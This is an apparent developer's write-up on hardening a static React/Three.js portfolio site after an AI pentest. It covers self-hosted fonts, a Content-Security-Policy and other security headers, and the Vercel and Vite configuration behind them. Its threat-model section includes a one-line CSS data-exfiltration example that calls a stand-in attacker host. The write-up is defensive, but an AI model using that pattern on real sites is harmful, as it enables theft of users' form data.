# Hardening a Modern Jamstack Portfolio: From Security Assessment to Zero-Trust Edge Resilience

**Author:** Fawaz Balogun — Cybersecurity Analyst & Software Engineer  
**Target:** `https://juwonbal.dev/`  
**Assessment Source:** Keygraph AI Pentester (Shannon)  
**Evaluation Date:** October 11, 2026  
**Status:** Remediated & Production-Hardened  
**PDF Report:** [SECURITY_HARDENING_ARTICLE.pdf](file:///c:/Users/juwon/Portfolio/SECURITY_HARDENING_ARTICLE.pdf)

---

## Executive Summary & Assessment Baseline

On October 11, 2026, an automated penetration test and security audit was conducted against `https://juwonbal.dev/` by Keygraph's AI penetration testing platform (Shannon). The assessment evaluated the system across standard critical exploitation categories: **Injection (SQLi, NoSQLi, Command Injection)**, **Cross-Site Scripting (XSS)**, **Authentication Mechanisms**, **Authorization Controls**, and **Server-Side Request Forgery (SSRF)**.

The audit recorded **zero confirmed vulnerabilities** across all active exploitation classes. The portfolio represents a client-rendered Single-Page Application (SPA) constructed with Vite, React Three Fiber, custom GLSL shaders, and TypeScript. Because the system possesses no dynamic server runtime, no API endpoints, no authenticated sessions, and no server-side data persistence, traditional attack vectors are architecturally absent rather than merely unexploited.

> **Residual Vulnerability Finding — Keygraph Pentest Shannon:**  
> *"Residual risk is confined to hosting- and supply-chain-layer hardening — missing security response headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) and an SRI-less Google Fonts stylesheet — which fall outside the assessed exploitation classes."*

In professional security engineering, receiving a "zero critical exploits" score is not the conclusion of the security lifecycle; rather, it establishes the baseline for defense-in-depth hardening. Without comprehensive edge response headers and with unverified external CDN dependencies, a client application remains exposed to client-side framing, clickjacking, MIME confusion, third-party CDN tampering, and device capability exploitation.

---

## Threat Vector Breakdown & Attack Surface Analysis

The vulnerabilities identified in the assessment represent two distinct architectural categories: **Client-Side Supply Chain Vulnerability** and **Hosting-Layer HTTP Response Header Absence**.

| Component | Identified Defect | Threat Model / Attack Vector | Remediation Path |
| :--- | :--- | :--- | :--- |
| **Typography Delivery** | External Google Fonts loaded without Subresource Integrity (SRI) | CDN compromise, dynamic style injection, user fingerprinting, GDPR statutory liability | Complete migration to self-hosted WOFF2 fonts bundled on same origin |
| **Content Security Policy** | No CSP header or meta declaration delivered | XSS exploitation potential, unauthorized external resource loading, data exfiltration | Strict `Content-Security-Policy` with same-origin whitelisting |
| **Clickjacking Protection** | Missing `X-Frame-Options` and `frame-ancestors` | Framing inside malicious iframes, UI redress attacks, clickjacking | `X-Frame-Options: DENY` and `frame-ancestors 'none'` |
| **MIME Sniffing** | Missing `X-Content-Type-Options` | MIME-confusion drive-by execution of user-controlled or cached content | `X-Content-Type-Options: nosniff` |
| **Referrer Privacy** | Default browser referrer leakage | Exposing client navigation paths and queries to external outbound links | `Referrer-Policy: strict-origin-when-cross-origin` |
| **Browser Capabilities** | Missing `Permissions-Policy` | Unauthorized access to hardware APIs (webcam, mic, geolocation, sensors) | Explicit revocation of unnecessary APIs in `Permissions-Policy` |

### The Architectural Nuance of Static SPAs
Traditional web vulnerabilities (SQL injection, remote command execution, insecure deserialization, broken object level authorization) assume a stateful backend processing user input against a database. In a Vite + React Single-Page Application:
- The web server functions purely as a static content delivery vehicle distributing pre-compiled JS, HTML, CSS, and 3D assets.
- Input vectors (such as camera navigation or planetary selection in Three.js) manipulate local browser memory and GPU buffers rather than reaching a remote database.
- Consequently, the browser becomes the primary security boundary, making browser-enforced policies (CSP, CORP, COOP, and frame restrictions) the paramount line of defense.

---

## Deep Dive: The Google Fonts & Subresource Integrity Paradox

### What is Subresource Integrity (SRI)?
Subresource Integrity (SRI) is a W3C security specification enabling web browsers to verify that resources fetched from third-party servers (such as CDNs) have not been manipulated or tampered with by an adversary. A cryptographic digest is declared directly on the referencing tag:

```html
<link rel="stylesheet" href="https://cdn.example.com/library.css" 
      integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" 
      crossorigin="anonymous" />
```

When the client downloads the remote asset, the browser computes the cryptographic hash of the incoming payload. If the computed digest matches the attribute value, execution proceeds. If an adversary compromises the CDN host, poisons DNS resolution, or performs a Man-in-the-Middle (MITM) payload substitution, the browser detects the mismatch and immediately aborts resource loading.

### Why Google Fonts Fails With Static SRI Hashes
A recurring mistake made by development teams attempting to satisfy automated scanner findings is placing a static `integrity` attribute onto Google Fonts links (e.g. `https://fonts.googleapis.com/css2?...`). In production, this causes immediate, catastrophic typography failure across various platforms and browsers.

The underlying root cause lies in Google Fonts' architecture: **dynamic user-agent content negotiation**. When a client requests font CSS, Google's edge inspects the incoming `User-Agent` header and dynamically generates custom CSS:
- Modern Chromium, Safari, and Firefox engines receive tailored WOFF2 declarations partitioned into discrete unicode-range subsets (Latin, Latin-Ext, Cyrillic, Greek, Vietnamese).
- Legacy browsers receive alternative monolithic WOFF or TTF format fallbacks.
- Google continuously and silently updates its font subset groupings, character maps, and internal CDN binary hashes.

Because the returned stylesheet is dynamically assembled, its byte sequence is non-deterministic. A cryptographic hash generated on Chrome on Windows will fail on Safari on iOS, and will break across all browsers whenever Google deploys an upstream CDN update.

### The Threat Model of External Typography CDNs
Loading stylesheets from external third-party infrastructure without integrity guarantees introduces several serious attack vectors:
1. **CSS-Based Data Exfiltration:** If an external stylesheet is manipulated, CSS can be weaponized to exfiltrate sensitive data via attribute selectors that trigger background HTTP requests (e.g., `input[value^="a"] { background: url('//attacker.com/leak?a'); }`), alter button hitboxes, or execute phishing overlay injections.
2. **User Privacy Leakage & Regulatory Sanctions:** Every external font fetch leaks the visitor's IP address, browser fingerprint, and referral headers to Google servers. In 2022, the Munich Regional Court (LG München, Az. 3 O 17493/20) confirmed that transmitting IP addresses via remote Google Fonts without prior explicit consent violates the European General Data Protection Regulation (GDPR), exposing operators to statutory fines.
3. **Network Fragility & Outage Cascade:** External CDN latency spikes, DNS resolution throttling, or regional CDN outages trigger Flash of Invisible Text (FOIT) and degrade Core Web Vitals (First Contentful Paint and Cumulative Layout Shift).

---

## Remediation: Zero-Trust Font Self-Hosting Architecture

To resolve the pentest finding definitively, the portfolio was transitioned to 100% first-party self-hosted typography.

### Technical Implementation Steps
1. **Binary Acquisition & Optimization:** We downloaded optimized WOFF2 binaries for the exact typefaces utilized in the application:
   - `spacegrotesk-variable.woff2` (22.2 KB) — Primary sans-serif typography, variable weight 300 to 700.
   - `spacemono-400.woff2` (16.5 KB) & `spacemono-700.woff2` (16.7 KB) — Space HUD monospace interfaces.
   - `newscycle-400.woff2` (13.2 KB) & `newscycle-700.woff2` (13.4 KB) — Star Wars cinematic opening text crawl.  
   All five font files total approximately 82 KB and are stored directly in `public/fonts/`.

2. **First-Party `@font-face` Declarations:** In `src/index.css`, explicit rules were declared:
```css
/* Supply Chain Hardening: Self-Hosted WOFF2 Typefaces (Zero External CDN) */
@font-face {
  font-family: 'Space Grotesk';
  font-style: normal;
  font-weight: 300 700;
  font-display: swap;
  src: url('/fonts/spacegrotesk-variable.woff2') format('woff2');
}
@font-face {
  font-family: 'Space Mono';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url('/fonts/spacemono-400.woff2') format('woff2');
}
@font-face {
  font-family: 'Space Mono';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: url('/fonts/spacemono-700.woff2') format('woff2');
}
@font-face {
  font-family: 'News Cycle';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: url('/fonts/newscycle-700.woff2') format('woff2');
}
```

3. **Preload Directives in `index.html`:**
```html
<!-- Preload Self-Hosted Core Fonts -->
<link rel="preload" href="/fonts/spacegrotesk-variable.woff2" as="font" type="font/woff2" crossorigin />
<link rel="preload" href="/fonts/spacemono-400.woff2" as="font" type="font/woff2" crossorigin />
```

### Remediation Benefits Matrix
- **SRI Finding Neutralized:** Completely eliminates third-party stylesheet imports that previously lacked integrity digests.
- **Attack Vector Elimination:** Third-party CDN compromises cannot inject malicious CSS or font glyph exploits into user sessions.
- **Strict Same-Origin CSP:** Directives `font-src` and `style-src` no longer require whitelisting Google origins.
- **Full GDPR Compliance:** Zero IP address or user-agent leakage to Google servers; eliminates statutory privacy exposure.
- **Zero Render-Blocking Latency:** No external DNS lookups or TLS handshakes; fonts are preloaded and served from local edge cache.

---

## Comprehensive HTTP Security Response Headers

HTTP response headers serve as the browser's security contract. By instructing the user agent on allowed execution contexts, framing rules, and API permissions, modern security headers enforce guardrails that render entire vulnerability categories inert.

### Content-Security-Policy (CSP) Architecture
Content Security Policy is the single most powerful defense against Cross-Site Scripting (XSS), data injection, and malicious frame embedding. Because the portfolio utilizes client-rendered Three.js shaders and dynamic React inline HUD coordinates, the CSP policy was calibrated to maximize protection without impeding WebGL runtime functionality.

| Directive | Configured Value | Security Rationale & Defense |
| :--- | :--- | :--- |
| `default-src` | `'self'` | Default-deny fallback. Any resource type not explicitly enumerated is restricted exclusively to the site's origin. |
| `script-src` | `'self'` | Restricts executable code to first-party Vite bundles. Blocks remote script inclusion, inline malicious scripts, and eval. |
| `style-src` | `'self' 'unsafe-inline'` | Permits local CSS bundles and inline style bindings required by React Three Fiber for dynamic HUD coloring. |
| `font-src` | `'self' data:` | Locked to same-origin thanks to our self-hosted font architecture. Blocks unauthorized remote typefaces. |
| `img-src` | `'self' data: blob: https:` | Permits local assets, data URIs for procedural canvas/planet textures, and remote badge graphics over HTTPS. |
| `connect-src` | `'self' blob:` | Prevents client-side scripts from transmitting beacon data, telemetry, or stolen DOM data to unauthorized third parties. |
| `object-src` | `'none'` | Completely blocks execution of legacy plugins, Flash objects, Java applets, and Silverlight containers. |
| `base-uri` | `'self'` | Prevents attacker manipulation of the HTML `<base>` element to hijack relative link resolutions. |
| `form-action` | `'self'` | Prevents malicious form hijacking or target redirection to unauthorized collection endpoints. |
| `frame-ancestors` | `'none'` | Modern CSP replacement for X-Frame-Options. Forbids any parent website from embedding the portfolio in an `<iframe>`. |
| `upgrade-insecure-requests` | Flag enabled | Instructs user agents to rewrite all HTTP URLs to HTTPS before requesting resources. |

### Defense-in-Depth Supporting Headers
1. **`X-Frame-Options: DENY`**: Guarantees legacy browsers (lacking CSP Level 2/3 `frame-ancestors`) strictly refuse to render the page inside a frame or iframe. Completely prevents UI Redress and Clickjacking.
2. **`X-Content-Type-Options: nosniff`**: Instructs browsers to strictly honor the declared MIME type in `Content-Type`. Prevents MIME sniffing (e.g. interpreting text or images as executable JavaScript).
3. **`Referrer-Policy: strict-origin-when-cross-origin`**: Controls leakage across outbound links. Outbound clicks to GitHub/Medium strip full paths, transmitting only root origin over HTTPS, and sending zero referrer data when downgrading to HTTP.
4. **`Permissions-Policy`**: Disables unnecessary hardware APIs: `camera=(), microphone=(), geolocation=(), interest-cohort=(), payment=(), usb=(), accelerometer=(), gyroscope=(), magnetometer=(), display-capture=()`.
5. **`Strict-Transport-Security (HSTS)`**: `max-age=63072000; includeSubDomains; preload`. Mandates HTTPS across all user interactions for 2 full years, applies to subdomains, and qualifies the domain for browser preloaded HSTS lists.
6. **`Cross-Origin Isolation (COOP & CORP)`**: `COOP: same-origin-allow-popups` provides process isolation against Spectre attacks while permitting popups; `CORP: same-origin` prevents cross-origin embedding of internal assets.
7. **`X-Permitted-Cross-Domain-Policies: none`**: Blocks legacy Flash and PDF cross-domain data policies.

---

## Multi-Tiered Hosting & Infrastructure Implementation

Modern Jamstack architectures deploy static bundles to edge Content Delivery Networks rather than monolithic web servers running Apache or Nginx. A robust deployment must enforce security across edge hosting, universal static fallback, in-document HTML meta tags, and local developer runtime.

### Tier 1: Vercel Edge Configuration (`vercel.json`)
Because `juwonbal.dev` is hosted on Vercel's global edge network (verified via `Server: Vercel` response headers), we created a root configuration file `vercel.json` instructing Vercel's edge nodes to inject these headers into all outgoing responses:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: blob: https:; connect-src 'self' blob:; media-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests;"
        },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=(), interest-cohort=(), payment=(), usb=(), accelerometer=(), gyroscope=(), magnetometer=(), display-capture=()" },
        { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains; preload" },
        { "key": "Cross-Origin-Opener-Policy", "value": "same-origin-allow-popups" },
        { "key": "Cross-Origin-Resource-Policy", "value": "same-origin" },
        { "key": "X-Permitted-Cross-Domain-Policies", "value": "none" }
      ]
    }
  ]
}
```

### Tier 2: Universal Jamstack Fallback (`public/_headers`)
To guarantee portability should the site ever be replicated or deployed onto Netlify, Cloudflare Pages, or other Jamstack hosts, we added `public/_headers`. During the Vite build, this file is automatically placed into `dist/_headers`.

### Tier 3: In-HTML Client Fallback (`index.html`)
As defense-in-depth against host configuration dropouts, client-level meta directives were added directly into the HTML document head:
```html
<!-- Security Headers Fallback -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: blob: https:; connect-src 'self' blob:; media-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self';" />
<meta http-equiv="X-Content-Type-Options" content="nosniff" />
<meta name="referrer" content="strict-origin-when-cross-origin" />
```

### Tier 4: Development & Preview Parity (`vite.config.ts`)
Security headers frequently break client applications if introduced only in production. To maintain parity across development and automated testing, Vite's local dev server (`server.headers`) and production preview server (`preview.headers`) were configured with the exact same security headers in `vite.config.ts`.

---

## Empirical Verification & Security Audit Results

Every change was rigorously tested and verified across multiple testing vectors:

### 1. HTTP Response Inspection
We verified that headers are properly emitted upon asset requests using low-level network probes:
```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Security-Policy: default-src 'self'; script-src 'self' ...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), ...
Cross-Origin-Opener-Policy: same-origin-allow-popups
Cross-Origin-Resource-Policy: same-origin
X-Permitted-Cross-Domain-Policies: none
```

### 2. Production Compilation & Headless Browser Validation
The project was compiled via `npm run build` (`tsc -b && vite build`) completing in 7.93 seconds with zero type errors. All five self-hosted WOFF2 font files were verified inside `dist/fonts/`. Headless Chrome validated full Three.js canvas rendering, GLSL shaders, Star Wars intro crawl animation, and link isolation without any console errors.

---

## Comparative Hardening Scorecard

| Security Vector | Prior State (Pentest Baseline) | Hardened State (Remediated) | Result Status |
| :--- | :--- | :--- | :--- |
| **Content Security Policy** | None (Permissive / Unrestricted) | Strict `default-src 'self'` with locked origins | **Enforced** |
| **Clickjacking Protection** | Missing (Embeddable in iframes) | `X-Frame-Options: DENY` + `frame-ancestors 'none'` | **Protected** |
| **Font Delivery & SRI** | Remote Google CDN without SRI hash | 100% Self-hosted WOFF2 on same-origin | **Hardened** |
| **MIME Sniffing** | Browser sniffing enabled | `X-Content-Type-Options: nosniff` | **Protected** |
| **Referrer Privacy** | Default browser referrer leakage | `strict-origin-when-cross-origin` | **Enforced** |
| **Hardware API Sandbox** | All browser APIs accessible | Revoked via comprehensive `Permissions-Policy` | **Sandboxed** |
| **Transport Encryption** | HSTS header default | 2-year preload-ready HSTS with subdomains | **Preload-Ready** |
| **Cross-Origin Isolation** | Unrestricted | COOP (`same-origin-allow-popups`) & CORP (`same-origin`) | **Isolated** |

---

## Key Architectural Takeaways for Web Engineers

1. **Static Architecture Eliminates Server Risks, Not Edge Risks:** While static Jamstack sites avoid SQL injection and authentication vulnerabilities, client-side integrity and edge transport headers remain the primary perimeter.
2. **Self-Hosting Beats Dynamic CDNs:** Due to user-agent subsetting, Google Fonts and dynamic CDNs cannot be reliably paired with Subresource Integrity. Self-hosting eliminates supply chain risk, enforces GDPR compliance, and improves load speed.
3. **Multi-Tiered Header Declarations Ensure Resilience:** Combining platform edge rules (`vercel.json`), static hosting headers (`_headers`), and document meta tags guarantees protection across any deployment environment.
